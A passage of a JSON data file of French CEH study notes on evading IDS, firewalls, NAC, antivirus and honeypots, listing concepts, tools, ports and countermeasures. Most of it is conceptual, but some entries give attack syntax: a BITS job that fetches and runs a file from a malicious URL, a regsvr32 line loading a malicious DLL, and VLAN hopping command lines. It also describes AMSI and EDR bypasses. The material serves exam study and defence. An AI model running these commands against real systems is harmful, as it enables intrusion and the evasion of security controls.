actif + inline : détecte ET prévient."},{"name":"IDS vs IPS","desc":"La différence essentielle tient au positionnement et à l’action : l’IDS observe et alerte, alors que l’IPS est sur le chemin du trafic et peut empêcher la communication malveillante avant qu’elle n’atteigne la cible.","cheat":{"words":1,"title":"Réflexe rapide","rows":[["IDS","passif · monitor · alerte"],["IPS","inline · bloque/filtre · alerte"]]},"exam":"IDS passif / IPS actif et inline."},{"name":"Flux de détection IDS","desc":"Le trafic est comparé aux signatures connues. S’il n’y a pas de correspondance, l’analyse peut se poursuivre avec la détection d’anomalies puis l’analyse stateful du protocole. Lorsqu’un événement correspond à une règle, l’action prévue est déclenchée.","cheat":{"words":1,"title":"Ordre logique","rows":[["1","Signature file comparison"],["2","Anomaly detection"],["3","Stateful protocol analysis"],["4","Action rule"]]}},{"name":"Signature Recognition","desc":"Méthode dite misuse detection : les événements ou paquets sont comparés à des signatures binaires ou patterns associés à des attaques connues. Elle est efficace pour les menaces déjà identifiées mais dépend fortement de la qualité et de l’actualité de la base de signatures.","exam":"Signature = connu/pattern matching."},{"name":"Anomaly Detection","desc":"La défense construit un modèle de comportement considéré comme normal, puis signale les écarts. La difficulté principale est de définir correctement ce profil de référence afin de ne pas transformer des variations légitimes en alertes.","exam":"Anomaly = écart au comportement normal."},{"name":"Protocol Anomaly Detection","desc":"Le trafic est comparé au comportement attendu d’un protocole. La logique est : établir un baseline du protocole, identifier les écarts puis appliquer des règles de détection aux comportements qui ne respectent pas les standards ou l’usage prévu."},{"name":"NIDS","desc":"Network-Based IDS : capteur placé sur le réseau, généralement en mode promiscuous, qui examine les paquets afin de repérer scans, tentatives d’intrusion, DoS et autres patterns malveillants. Il donne une vision réseau sans installer un agent sur chaque hôte.","exam":"NIDS = réseau, trafic, promiscuous mode."},{"name":"HIDS","desc":"Host-Based IDS : agent ou mécanisme d’audit concentré sur un hôte précis. Il observe les événements de cette machine plutôt que l’ensemble du trafic réseau, au prix d’un coût de déploiement et de supervision sur chaque système.","exam":"HIDS = événements d’un hôte."},{"name":"Faux positifs & coût des signatures","desc":"Une signature peut correspondre à du trafic légitime et générer un faux positif. Une base de signatures volumineuse demande aussi davantage de ressources ; sous charge, le capteur peut devenir moins efficace ou perdre des paquets."}]},{"g":"Pare-feu & architecture réseau","items":[{"name":"Firewall","desc":"Équipement ou logiciel qui autorise ou refuse les communications selon un ensemble de règles. Il inspecte notamment les adresses source/destination, les ports, le protocole et, selon la technologie, l’état de la connexion ou les données applicatives."},{"name":"Packet Filtering Firewall","desc":"Pare-feu qui décide paquet par paquet à partir de critères tels que l’IP source/destination, les ports et le protocole. Il travaille principalement aux couches réseau/transport et ne comprend pas nécessairement la logique applicative du trafic."},{"name":"Circuit-Level Gateway","desc":"Technologie de pare-feu associée à la couche Session dans la classification du cours. Elle contrôle l’établissement de sessions plutôt que le contenu applicatif complet."},{"name":"Application-Level Firewall","desc":"Filtrage au niveau applicatif : la décision ne repose plus uniquement sur IP/port, mais sur le protocole et les échanges de l’application. Cela permet une inspection plus fine du trafic de couche 7."},{"name":"Stateful Multilayer Inspection","desc":"Inspection qui tient compte de l’état des connexions en plus des informations de paquets. Le pare-feu peut donc distinguer un paquet appartenant à une session déjà autorisée d’un paquet isolé ou inattendu."},{"name":"Application Proxy","desc":"Intermédiaire applicatif qui termine une connexion d’un côté et en établit une autre de l’autre côté. Le proxy peut appliquer des contrôles au niveau du protocole applicatif plutôt que simplement relayer les paquets."},{"name":"NAT","desc":"Network Address Translation modifie les adresses réseau lors du passage entre des zones. Le cours le classe parmi les technologies de pare-feu au niveau Network, même si sa fonction première est la traduction d’adresses."},{"name":"VPN","desc":"Mécanisme d’accès sécurisé qui chiffre, contrôle l’intégrité et encapsule le trafic sur un réseau non fiable. Le support précise qu’un VPN n’est pas intrinsèquement une technologie de pare-feu, même si les deux fonctions sont souvent réunies dans le même équipement.","exam":"VPN ≠ firewall par nature ; ils sont souvent intégrés ensemble."},{"name":"NGFW","desc":"Next-Generation Firewall : combine les fonctions classiques de pare-feu avec des capacités plus avancées telles que deep packet inspection, application awareness, IPS intégré et threat intelligence."},{"name":"DMZ","desc":"Zone tampon entre Internet et le réseau interne. Elle héberge les services devant être accessibles depuis l’extérieur, comme web, DNS ou mail, afin d’éviter d’exposer directement les systèmes internes sensibles.","exam":"DMZ = services exposés, pas les serveurs internes sensibles."},{"name":"Defense in Depth","desc":"Approche qui superpose plusieurs couches de protection. Le but est de ralentir l’attaquant et de laisser davantage de temps à la détection et à la réponse si une première barrière échoue."},{"name":"Defense in Breadth","desc":"Approche plus large qui ne se limite pas aux couches réseau : elle prend en compte les attaques applicatives, les personnes, les processus, la technologie et l’ensemble de la surface d’attaque."},{"name":"UTM — Unified Threat Management","desc":"Équipement qui regroupe plusieurs fonctions comme firewall, IDS/IPS et anti-malware dans une même plateforme. Il simplifie la gestion, mais concentre aussi plusieurs contrôles sur un seul système, avec un risque de point unique de panne ou de goulot d’étranglement."},{"name":"Defensible Network Architecture","desc":"Architecture conçue non seulement pour empêcher l’entrée, mais aussi pour voir, alerter et contrôler un attaquant qui aurait franchi le périmètre. Elle repose sur la visibilité, la journalisation, la segmentation et une capacité réelle d’isolation/réponse."},{"name":"Choke Point","desc":"Point de contrôle du réseau où le trafic peut être inspecté, bloqué ou redirigé. Les choke points rendent la réponse plus rapide parce que l’équipe dispose déjà d’endroits où appliquer des contrôles pendant un incident."}]},{"g":"Reconnaissance & évasion IDS/Firewall","items":[{"name":"15 techniques d’évasion CEH","desc":"La liste à reconnaître comprend : Firewalking, Banner Grabbing, IP Address Spoofing, Source Routing, Tiny Fragments, IP à la place d’une URL, Proxy Server, ICMP Tunneling, ACK/HTTP Tunneling, SSH/DNS Tunneling, External Systems, MITM, Content/XSS, HTML Smuggling et Windows BITS.","cheat":{"words":1,"title":"Liste condensée","rows":[["Recon","Firewalking · Banner grabbing"],["Routage/paquets","IP spoofing · Source routing · Tiny fragments"],["Tunnel","ICMP · ACK · HTTP · SSH · DNS"],["Intermédiaires","Proxy · External systems · MITM"],["Contenu/OS","Content/XSS · HTML Smuggling · BITS"]]},"exam":"Mémoriser la liste des 15 techniques."},{"name":"Port Scanning pour identifier une défense","desc":"Certains produits de sécurité exposent des ports ou services caractéristiques. Un scan peut donc aider à identifier un firewall/IDS ou ses composants avant de choisir une technique d’évasion."},{"name":"Firewalking","desc":"Technique qui utilise le TTL pour déterminer quelles règles d’ACL laissent passer un paquet à travers une passerelle. Des paquets TCP/UDP sont envoyés avec un TTL calculé pour expirer juste après le firewall ; les réponses permettent d’inférer ce que le filtrage autorise ou bloque.","exam":"Firewalking = TTL pour cartographier les ACL du firewall."},{"name":"Banner Grabbing","desc":"Fingerprinting à partir des bannières de services. Une bannière peut révéler le produit ou la version/firmware et donc aider à identifier précisément la technologie de sécurité exposée."},{"name":"IP Address Spoofing","desc":"L’adresse IP source d’un paquet est remplacée par celle d’un hôte considéré comme fiable. Si les règles s’appuient trop sur la confiance accordée à cette adresse, le trafic forgé peut franchir certains contrôles."},{"name":"Source Routing","desc":"Le chemin du paquet est imposé par l’émetteur afin de passer par des segments moins surveillés ou moins protégés. L’objectif est de contourner les zones où IDS et firewall sont correctement positionnés."},{"name":"Loose Source Routing","desc":"L’émetteur impose une ou plusieurs étapes que le paquet doit traverser, mais ne fixe pas tout le chemin de bout en bout.","exam":"Loose = certains passages seulement."},{"name":"Strict Source Routing","desc":"L’émetteur spécifie le chemin exact que le paquet doit suivre. Cette distinction avec le loose source routing est un point de reconnaissance important.","exam":"Strict = route exacte."},{"name":"Tiny Fragments","desc":"Le paquet est découpé en fragments suffisamment petits pour pousser des informations importantes de l’en-tête TCP dans un fragment suivant. Si un équipement filtre surtout le premier fragment ou réassemble mal le flux, une signature peut être manquée."},{"name":"IP au lieu de l’URL","desc":"Lorsqu’un filtrage bloque surtout un nom de domaine, l’accès direct à l’adresse IP peut parfois contourner la règle. Cette méthode échoue si le contrôle suit également l’adresse IP ou applique un filtrage plus complet."},{"name":"Proxy Server","desc":"Technique de la liste CEH consistant à faire transiter la communication par un intermédiaire. Elle masque ou modifie le chemin direct entre le client et la destination, ce qui peut changer ce que voit le contrôle réseau."},{"name":"Fragmentation Timeout Attack — scénario 1","desc":"Le délai de réassemblage du NIDS est plus court que celui de la victime. L’IDS abandonne les fragments avant la cible, alors que la cible continue à les conserver et peut finalement reconstruire le paquet réel."},{"name":"Fragmentation Timeout Attack — scénario 2","desc":"Le timeout de l’IDS est plus long que celui de la victime. Des fragments leurres sont envoyés puis laissés expirer côté victime ; les fragments réels arrivent ensuite. L’IDS et la cible ne reconstruisent alors pas la même chose."},{"name":"Pre-Connection SYN Desynchronization","desc":"Un SYN initial avec checksum TCP invalide est envoyé avant la vraie connexion. Si l’IDS ne valide pas correctement le checksum, son état peut diverger de celui de la cible, qui ignore le paquet invalide."},{"name":"Post-Connection SYN Desynchronization","desc":"Après l’établissement d’une connexion, un SYN avec des numéros de séquence divergents est injecté. La cible déjà en état ESTABLISHED l’ignore, tandis qu’un IDS mal géré peut resynchroniser son suivi sur ce faux SYN."},{"name":"DGA — Domain Generation Algorithm","desc":"Algorithme qui génère de nombreux noms de domaine pseudo-aléatoires à partir d’un seed partagé avec le C2. Au lieu d’utiliser une adresse statique facile à bloquer, le malware et le serveur peuvent calculer les mêmes domaines de rendez-vous au fil du temps."},{"name":"HTML Smuggling","desc":"Technique qui assemble ou déclenche côté navigateur un fichier à partir de HTML5/JavaScript. Le contenu malveillant peut ainsi ne pas traverser un proxy ou une passerelle email sous sa forme finale, ce qui réduit la visibilité du contrôle intermédiaire."},{"name":"Windows BITS Evasion","desc":"BITS exécute des transferts en arrière-plan comme fonctionnalité Windows de confiance. Un job BITS peut être détourné pour récupérer un fichier et déclencher une commande, en profitant du fait que le mécanisme est légitime et intégré au système."}]},{"g":"Tunneling","items":[{"name":"Tunneling — principe","desc":"Le trafic d’un protocole ou d’une application est encapsulé dans un autre protocole généralement autorisé par le réseau. Le contrôle voit alors principalement le protocole porteur, alors que sa zone de données transporte une communication différente."},{"name":"ICMP Tunneling","desc":"Des données sont placées dans le champ data des paquets ICMP Echo. Comme ce champ n’impose pas un contenu applicatif spécifique, il peut transporter des données ou une communication cachée à travers un réseau qui autorise ICMP."},{"name":"ACK Tunneling","desc":"Le trafic est caché dans des paquets TCP marqués ACK, en profitant du fait que certains équipements accordent davantage de confiance aux paquets qui semblent appartenir à une connexion déjà établie."},{"name":"HTTP Tunneling","desc":"Une communication est encapsulée dans du trafic HTTP afin de se confondre avec des échanges web autorisés."},{"name":"SSH Tunneling","desc":"Le port forwarding SSH transporte d’autres communications dans un canal SSH chiffré. Le firewall voit alors une session SSH autorisée plutôt que les protocoles internes encapsulés."},{"name":"DNS Tunneling","desc":"Des données sont encodées dans les requêtes ou réponses DNS. Comme la résolution DNS est souvent autorisée vers l’extérieur, elle peut devenir un canal de communication caché si elle n’est pas surveillée."}]},{"g":"NAC & Endpoint Security Evasion","items":[{"name":"NAC — Network Access Control","desc":"Contrôle l’accès au réseau selon l’identité ou l’état d’un équipement. Le module traite deux contournements principaux : exploiter la segmentation/VLAN ou réutiliser un équipement déjà authentifié."},{"name":"NAC Bypass par VLAN Hopping","desc":"Le contournement exploite Dynamic Trunking Protocol lorsque des ports de switch sont laissés en dynamic auto ou dynamic desirable. Un trunk non autorisé peut alors donner accès à plusieurs VLANs au-delà du segment initial."},{"name":"DTP — Dynamic Trunking Protocol","desc":"Protocole utilisé pour négocier automatiquement un trunk entre équipements Cisco. Dans le scénario du module, sa configuration dynamique devient le point faible permettant le VLAN hopping."},{"name":"Pre-authenticated Device Bypass","desc":"Un attaquant place son équipement sur le chemin d’un terminal déjà authentifié au NAC et fait transiter ses propres paquets à travers cette relation de confiance. Le NAC continue alors à voir l’équipement légitime comme point d’accès autorisé."},{"name":"Ghostwriting","desc":"Modification de la structure binaire d’un malware sans changer sa fonction : déconstruction, insertion de code assembleur arbitraire puis reconstruction. L’objectif est de faire varier la signature binaire utilisée par un antivirus statique."},{"name":"Application Whitelisting Bypass","desc":"Un programme autorisé est détourné pour charger du code non autorisé, notamment via DLL hijacking ou l’usage de binaires système tels que rundll32/regsvr32/PowerShell. Le processus paraît légitime parce que le lanceur lui-même est whitelisted."},{"name":"Process Injection","desc":"Le code est placé dans l’espace mémoire d’un processus déjà en cours d’exécution. La séquence Windows citée est : allocation distante, écriture du payload puis création d’un thread distant.","cheat":{"words":1,"title":"API sequence","rows":[["1","VirtualAllocEx()"],["2","WriteProcessMemory()"],["3","CreateRemoteThread()"]]},"exam":"VirtualAllocEx → WriteProcessMemory → CreateRemoteThread."},{"name":"CPL Side-Loading","desc":"Un applet Control Panel légitime charge également un composant malveillant intégré ou placé à un emplacement attendu. L’apparence et une partie du comportement d’origine sont conservées pour masquer l’exécution supplémentaire."},{"name":"Direct System Calls","desc":"Au lieu de passer par les fonctions userland surveillées dans ntdll.dll, le code invoque directement les syscalls correspondants du noyau. Cela vise à contourner les hooks placés par certains mécanismes EDR."},{"name":"Thread Call Stack Spoofing","desc":"Le lien apparent entre l’adresse de retour et le shellcode est masqué pendant les périodes de sommeil du beacon. Le module cite l’interception de Sleep() afin de rendre la pile d’appels moins révélatrice pendant l’inactivité."},{"name":"In-memory Encryption of Beacon","desc":"Les régions mémoire exécutables du beacon sont chiffrées pendant le sommeil, puis déchiffrées lorsque l’implant reprend son activité. Le module cite XOR et les hooks de Sleep() comme mécanisme de ce camouflage mémoire."},{"name":"AMSI Bypass — Memory Hijacking","desc":"Le mécanisme détourne AmsiScanBuffer() afin de forcer le résultat de scan à être considéré comme propre, empêchant AMSI de signaler le contenu analysé.","exam":"AMSI bypass cité : AmsiScanBuffer() → AMSI_RESULT_CLEAN."},{"name":"AI-Assisted Evasion","desc":"Le module décrit l’usage d’IA pour produire des variantes de code différentes à chaque génération. L’objectif est de réduire la stabilité des signatures statiques auxquelles se fient certaines détections."}]},{"g":"Honeypots & deception","items":[{"name":"Honeypot","desc":"Ressource volontairement exposée pour attirer et observer les tentatives d’intrusion. Elle n’a pas d’activité métier autorisée ni de valeur de production ; une interaction avec elle est donc fortement suspecte et peut servir d’alerte précoce.","exam":"Honeypot = leurre sans activité métier légitime."},{"name":"Objectifs d’un honeypot","desc":"Le honeypot détourne l’attention des actifs réels et collecte des informations sur les outils, techniques, frappes clavier, ports testés et comportements de l’attaquant. Il sert donc à la fois de diversion et de capteur de renseignement."},{"name":"Low-Interaction Honeypot","desc":"Simule un nombre limité de services. Il collecte surtout des données transactionnelles et ne peut pas être compromis comme un système complet. Il est plus simple et moins risqué à exploiter.","exam":"Low interaction = services limités, pas de compromission complète."},{"name":"Medium-Interaction Honeypot","desc":"Simule un environnement plus riche avec un système, des applications et des services ressemblant davantage à une cible réelle, tout en restant contrôlé."},{"name":"High-Interaction Honeypot","desc":"Expose un environnement très complet afin que l’attaquant puisse interagir de manière réaliste avec les services et applications. Il fournit davantage d’observations, mais demande plus de contrôle et d’isolation."},{"name":"Pure Honeypot","desc":"Catégorie qui émule le réseau de production réel de l’organisation, avec un niveau de réalisme supérieur aux simples services simulés."},{"name":"Production Honeypot","desc":"Classification par stratégie de déploiement : leurre placé pour renforcer directement la détection ou la protection d’un environnement opérationnel."},{"name":"Research Honeypot","desc":"Classification par stratégie de déploiement : environnement conçu surtout pour étudier les comportements, techniques et outils des attaquants."},{"name":"Honeynet","desc":"Réseau composé de plusieurs honeypots afin de simuler une topologie plus complète et d’observer les mouvements d’un attaquant à travers plusieurs systèmes.","exam":"Honeynet = réseau de honeypots."},{"name":"Tar Pit","desc":"Leurre destiné à ralentir et retenir l’attaquant, en lui faisant perdre du temps sur une cible qui semble intéressante alors qu’elle est contrôlée et observée."},{"name":"Malware / Database / Spam / Email / Spider Honeypots","desc":"Le module classe aussi les honeypots selon la deception technology : leurres orientés malware, bases de données, spam, email ou exploration automatisée, en plus des honeynets."},{"name":"Détecter un honeypot — logique générale","desc":"Un honeypot peut se trahir par des incohérences : service annoncé qui ne se comporte pas comme le vrai produit, temps de réponse anormalement élevé, OUI MAC inhabituel, ports inattendus ou configurations/bannières trop génériques."},{"name":"Service Fingerprinting d’un honeypot","desc":"Comparer la bannière et le comportement du service avec ce qu’un vrai produit devrait renvoyer. Des écarts entre identité annoncée et comportement observé peuvent révéler une émulation."},{"name":"Response-Time Analysis","desc":"Un leurre très instrumenté peut répondre de manière plus lente ou plus variable qu’un service normal. Des mesures répétées de latence peuvent mettre en évidence cette surcharge d’émulation ou de journalisation."},{"name":"MAC/OUI Analysis","desc":"L’adresse MAC permet d’identifier l’OUI du constructeur. Une valeur inattendue ou incompatible avec le type d’équipement prétendu peut signaler un environnement virtuel ou simulé."},{"name":"Unexpected Open Ports","desc":"Comparer les ports ouverts au rôle supposé de la machine. Un serveur présenté comme un simple serveur web mais exposant des services supplémentaires inattendus peut être un leurre."},{"name":"Configuration & Metadata Analysis","desc":"Les bannières, valeurs par défaut, métadonnées et incohérences de configuration peuvent trahir un système construit pour simuler une cible plutôt qu’un véritable serveur de production."}]}]},"outil":{"groups":[{"g":"IDS / Firewall & détection","items":[{"name":"YARA","desc":"Outil de détection/classification fondé sur des règles. Les règles peuvent combiner chaînes texte, motifs hexadécimaux et expressions booléennes pour reconnaître des signatures de malware ou de contenu suspect."},{"name":"Snort","desc":"IDS réseau cité comme exemple de solution pouvant être identifié par ses services exposés. Dans le support, Snort est associé à TCP 80 et UDP 53 dans le contexte de fingerprinting d’IDS."},{"name":"HTTP Evader","desc":"Outil cité pour automatiser des tests visant à vérifier si un firewall peut être contourné par des variantes de trafic HTTP. Il est présenté côté défense comme moyen de tester les règles contre les techniques d’évasion."},{"name":"NetFlow","desc":"Source de télémétrie réseau qui résume les connexions : qui communique avec qui, sur quel port, pendant combien de temps et avec quel volume. Moins détaillé qu’une capture complète, mais adapté à la détection d’anomalies à grande échelle."},{"name":"Splunk / ELK / SIEM","desc":"Solutions de centralisation et corrélation des événements citées pour rendre la journalisation exploitable. Elles permettent de regrouper les logs, rechercher des patterns et générer des alertes sur des comportements anormaux."}]},{"g":"Reconnaissance & tunneling","items":[{"name":"Firewalk","desc":"Outil dédié au firewalking : il aide à déduire les règles d’une passerelle en envoyant des paquets dont le TTL est ajusté pour expirer autour du firewall."},{"name":"Nmap — firewalk script","desc":"Nmap peut réaliser le firewalking via son script dédié afin d’examiner quelles combinaisons de ports/protocoles semblent traverser un équipement de filtrage."},{"name":"Host2ip","desc":"Service cité pour résoudre un nom en adresse IP lorsqu’un filtrage bloque un domaine mais que l’accès direct par IP peut encore fonctionner."},{"name":"ICMPTX","desc":"Outil cité pour mettre en œuvre un tunnel dans la zone de données des paquets ICMP Echo."},{"name":"Hping","desc":"Outil de crafting réseau cité pour générer des paquets TCP ACK contenant des données dans le cadre d’un ACK tunneling ou d’expérimentations de filtrage."},{"name":"Nping","desc":"Générateur de paquets cité avec Hping pour construire des paquets ACK et tester le comportement d’un contrôle réseau."},{"name":"HTML Smuggler","desc":"Outil cité pour automatiser la création de contenu utilisé dans les scénarios d’HTML smuggling."}]},{"g":"BITS & Windows evasion","items":[{"name":"BITS job — commandes principales","desc":"Le support décrit un workflow en quatre étapes : créer le job, lui associer le fichier distant et son chemin local, définir la commande de notification puis reprendre le job.","syntax":"/create persistence\n/addfile persistence <Malicious URL> <Local Path>\n/SetNotifyCmdLine persistence <Local Path> NULL\n/resume persistence","cheat":{"words":1,"title":"Workflow","rows":[["/create","crée le job"],["/addfile","ajoute source + destination"],["/SetNotifyCmdLine","commande à lancer"],["/resume","démarre/reprend le transfert"]]}},{"name":"BitsParser","desc":"Outil cité pour analyser l’activité BITS et examiner les jobs/transferts suspects lors d’une investigation ou d’un contrôle défensif."},{"name":"regsvr32.exe","desc":"Binaire Windows légitime cité dans le contexte de contournement d’application whitelisting et de chargement de code via des composants autorisés.","syntax":"regsvr32.exe /s /n /u /i:\"C:\\path_to_malicious.dll\""},{"name":"rundll32.exe","desc":"Binaire Windows légitime cité comme mécanisme pouvant être détourné dans des scénarios d’application whitelisting bypass."},{"name":"PowerShell","desc":"Interpréteur Windows également cité comme composant légitime pouvant être utilisé dans un workflow de contournement des restrictions d’exécution."},{"name":"Ghostwriting.sh","desc":"Outil cité pour modifier la structure d’un binaire sans changer sa fonctionnalité afin de faire varier sa signature."},{"name":"CPLResourceRunner","desc":"Outil cité pour les scénarios de CPL side-loading, où un applet Control Panel apparemment légitime entraîne aussi le chargement de code non souhaité."},{"name":"ASBBypass.dll","desc":"Composant cité pour détourner AmsiScanBuffer() et imposer un résultat propre lors d’un scénario de bypass AMSI."}]},{"g":"NAC bypass","items":[{"name":"VLANPWN — DoubleTagging.py","desc":"Script cité pour construire un scénario de double tagging VLAN à partir de l’interface, du native VLAN et du target VLAN.","syntax":"python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim <IP> --attacker <IP>","cheat":{"words":1,"title":"Options","rows":[["--interface","interface réseau"],["--nativevlan","VLAN natif"],["--targetvlan","VLAN cible"],["--victim","IP victime"],["--attacker","IP attaquant"]]}},{"name":"VLANPWN — DTPHijacking.py","desc":"Script cité pour tester le DTP hijacking sur une interface lorsque la négociation automatique de trunk est exposée.","syntax":"python3 DTPHijacking.py --interface eth0"},{"name":"nac_bypass_setup.sh","desc":"Script cité parmi les outils de contournement d’un NAC via un équipement déjà authentifié."},{"name":"FENRIR","desc":"Outil cité pour les scénarios de bypass NAC utilisant un chemin à travers un terminal pré-authentifié."},{"name":"NACkered / Silentbridge / BITM","desc":"Autres outils cités par le module pour les scénarios de contournement NAC à travers un équipement déjà autorisé."}]},{"g":"Honeypots — déploiement","items":[{"name":"KFSensor","desc":"Honeypot low-interaction qui simule des services vulnérables/Trojans. Il surveille TCP, UDP et ICMP et peut alerter sur des scans de ports ou des attaques DoS."},{"name":"Honeytrap","desc":"Honeypot low-interaction fonctionnant comme daemon pour observer les attaques contre des services TCP/UDP. Il stocke les chaînes d’attaque, supporte notamment FTP/TFTP et journalise des HTTP_URIs."},{"name":"Cowrie","desc":"Outil de honeypot cité dans la liste des solutions du module."},{"name":"HoneyBOT","desc":"Solution de honeypot citée parmi les outils disponibles pour attirer et journaliser les activités malveillantes."},{"name":"Blumira Honeypot","desc":"Solution de honeypot citée dans la liste des outils du module."},{"name":"NeroSwarm / Valhala / StingBox","desc":"Autres solutions de honeypot citées dans le module pour construire des environnements de deception."}]},{"g":"Honeypot detection","items":[{"name":"Nmap -sV -p 80","desc":"Commande de fingerprinting d’un service HTTP pour comparer le produit annoncé et le comportement réel du service.","syntax":"nmap -sV -p 80 <target_ip>","cheat":{"words":1,"title":"Options","rows":[["-sV","détection service/version"],["-p 80","limite le scan au port 80"]]}},{"name":"Nmap response-time test","desc":"Scan contrôlé cité pour observer la latence et la variabilité de réponse d’un service potentiellement émulé.","syntax":"nmap -p 80 --scan-delay 1s --max-retries 5 <target_ip>","cheat":{"words":1,"title":"Options","rows":[["--scan-delay 1s","attend entre les probes"],["--max-retries 5","limite le nombre de retransmissions"]]}},{"name":"arp-scan","desc":"Outil utilisé pour inventorier les hôtes du réseau local et analyser leurs adresses MAC/OUI dans le cadre d’une détection de honeypot.","syntax":"arp-scan --interface=eth0 --localnet","cheat":{"words":1,"title":"Options","rows":[["--interface=eth0","interface à utiliser"],["--localnet","scanne le réseau local"]]}},{"name":"Nmap -p-","desc":"Scan de tous les ports TCP utilisé pour repérer des services inattendus par rapport au rôle prétendu de la cible.","syntax":"nmap -p- <target_ip>","exam":"-p- = tous les ports TCP."},{"name":"Ping / Traceroute","desc":"Outils cités en complément de l’analyse de temps de réponse pour repérer une latence anormale ou des comportements de chemin inhabituels autour d’un système leurre."}]}]},"port":{"groups":[{"g":"Protocoles réseau & filtrage","items":[{"name":"TCP","desc":"Protocole orienté connexion inspecté par les firewalls/IDS via ports, flags, état et numéros de séquence. Les techniques du module incluent tiny fragments, ACK tunneling et désynchronisation via SYN.","tr":"tcp"},{"name":"UDP","desc":"Protocole connectionless utilisé dans plusieurs scénarios de reconnaissance/tunneling. Les firewalls peuvent filtrer selon les ports, tandis que certains produits de sécurité exposent aussi des services UDP spécifiques.","tr":"udp"},{"name":"ICMP","desc":"Protocole de contrôle IP dont les Echo packets peuvent transporter des données arbitraires. Le module l’associe à ICMP tunneling et recommande aussi de contrôler certains messages ICMP TTL expired sur l’interface externe."},{"name":"IPv4 TTL","desc":"Time To Live décrémenté à chaque routeur. Le firewalking exploite précisément cette valeur afin de faire expirer le paquet autour du firewall et déduire le comportement des ACL."},{"name":"Source Routing","desc":"Fonction IP où l’émetteur influence ou impose le chemin de transit. Le module distingue Loose Source Routing et Strict Source Routing."}]},{"g":"Web, tunnel & C2","items":[{"name":"HTTP — 80/TCP","desc":"Trafic web pouvant servir de protocole porteur pour HTTP tunneling. Le module cite aussi TCP 80 comme port associé à Snort dans un exemple de fingerprinting d’IDS.","tr":"tcp"},{"name":"HTTPS — 443/TCP","desc":"HTTP chiffré sur TLS. Les contre-mesures du module recommandent l’inspection HTTPS/TLS pour éviter que le chiffrement ne devienne un angle mort du firewall.","tr":"tcp"},{"name":"DNS — 53","desc":"Résolution de noms pouvant être détournée comme canal de tunneling en encodant des données dans les requêtes/réponses. Le module cite également UDP 53 comme service associé à Snort dans un exemple de fingerprinting.","tr":"both"},{"name":"SSH — 22/TCP","desc":"Protocole chiffré permettant le port forwarding. Le SSH tunneling encapsule d’autres communications dans une session SSH autorisée.","tr":"tcp"},{"name":"HTML5 / JavaScript / MIME Blob","desc":"Mécanismes web utilisés dans l’HTML smuggling : JavaScript construit un blob avec un type MIME compatible et déclenche son téléchargement côté navigateur."}]},{"g":"NAC, switching & management","items":[{"name":"DTP — Dynamic Trunking Protocol","desc":"Protocole de négociation de trunk utilisé dans le scénario de bypass NAC par VLAN hopping. Les modes dynamic auto/dynamic desirable sont le point faible décrit dans le support."},{"name":"802.1Q / VLAN","desc":"La segmentation VLAN est le contexte du VLAN hopping : un trunk non autorisé ou un double tagging peut permettre de sortir du VLAN initial."},{"name":"ARP","desc":"Protocoles et tables de couche locale peuvent servir à inventorier les MAC/OUI, notamment avec arp-scan lors de la détection d’un honeypot."},{"name":"Syslog — UDP 514 / 1514","desc":"Le support cite ManageEngine Firewall Analyzer comme exemple de produit pouvant écouter sur UDP 514/1514, ce qui peut contribuer à son identification lors d’un scan.","tr":"udp"}]},{"g":"Honeypot protocols","items":[{"name":"FTP — 21/TCP","desc":"Service explicitement pris en charge par Honeytrap dans le module. Une exposition FTP inattendue peut aussi faire partie des indices relevés lors de l’énumération des ports d’un honeypot.","tr":"tcp"},{"name":"TFTP — 69/UDP","desc":"Service pris en charge par Honeytrap pour émuler et observer des interactions sur TFTP.","tr":"udp"},{"name":"TCP / UDP / ICMP monitoring","desc":"KFSensor est décrit comme surveillant les ports et interactions TCP, UDP et ICMP afin d’identifier scans et comportements d’attaque."}]}]},"contre":{"groups":[{"g":"Contre-mesures IDS","items":[{"name":"Traffic Normalization","desc":"Normaliser le trafic avant l’analyse supprime les ambiguïtés dont profitent fragmentation, ordonnancement ou représentations divergentes. L’IDS et la cible doivent idéalement interpréter le même flux.","exam":"Normalisation = contre-mesure clé contre les évasions IDS."},{"name":"Réassembler correctement les fragments","desc":"L’IDS doit reconstituer les paquets fragmentés dans le bon ordre avant d’appliquer les règles. Cela réduit les contournements fondés sur tiny fragments et fragmentation timeout."},{"name":"Analyser le trafic ambigu","desc":"Les flux ambigus doivent être évalués selon plusieurs interprétations possibles plutôt que supposés légitimes. Cela limite les divergences entre ce que voit le capteur et ce que traite réellement la cible."},{"name":"FIN / RST pour interrompre une session malveillante","desc":"Lorsqu’une intrusion TCP est identifiée, l’envoi d’un FIN ou RST peut mettre fin à la session et stopper la communication en cours."},{"name":"Détecter plusieurs variantes de NOP","desc":"Ne pas rechercher uniquement l’opcode 0x90 : un shellcode polymorphe peut utiliser d’autres instructions équivalentes afin d’éviter une signature trop simple."},{"name":"Placer l’IDS selon la topologie réelle","desc":"Le positionnement doit être choisi après analyse des flux, des hôtes et des zones à surveiller. Un IDS mal placé ne voit qu’une partie du trafic et laisse des chemins d’évasion non observés."},{"name":"Bloquer ICMP TTL Expired externe","desc":"Le support recommande de contrôler les messages ICMP TTL expired à l’interface externe et d’utiliser des valeurs TTL élevées afin de compliquer certaines formes de firewalking."},{"name":"Conserver les informations d’attaque","desc":"Enregistrer IP attaquant, IP victime et timestamp permet de corréler les tentatives d’évasion et de disposer de données exploitables pour l’analyse ultérieure."},{"name":"Patching & signature updates","desc":"Mettre à jour systèmes, équipements et bases de signatures réduit les techniques qui reposent sur des comportements connus, des failles corrigées ou une détection obsolète."}]},{"g":"Contre-mesures Firewall","items":[{"name":"Default Deny","desc":"Configurer la politique pour refuser par défaut et n’autoriser explicitement que les services nécessaires. Cela réduit la surface exposée et évite qu’un service oublié devienne un chemin de contournement.","exam":"Deny all, permit only required services."},{"name":"Règles précises IP / ports / protocoles","desc":"Les règles doivent préciser clairement sources, destinations, ports et protocoles autorisés, plutôt que s’appuyer sur des autorisations trop larges faciles à détourner."},{"name":"Deep Packet Inspection","desc":"Inspecter le contenu applicatif plutôt que seulement IP/port permet de détecter des tunnels ou des payloads cachés dans des protocoles normalement autorisés."},{"name":"HTTPS/TLS Inspection","desc":"Le trafic chiffré peut masquer le contenu aux contrôles réseau. Le module recommande une inspection HTTPS/TLS intégrée lorsque la politique et l’architecture le permettent."},{"name":"Limiter les connexions par IP","desc":"Fixer des limites réduit les abus fondés sur un très grand nombre de connexions simultanées depuis une même source."},{"name":"Remote Syslog protégé","desc":"Expédier les logs vers un serveur distant réduit le risque qu’un attaquant ayant compromis le firewall efface localement toutes les traces de son activité."},{"name":"Surveiller 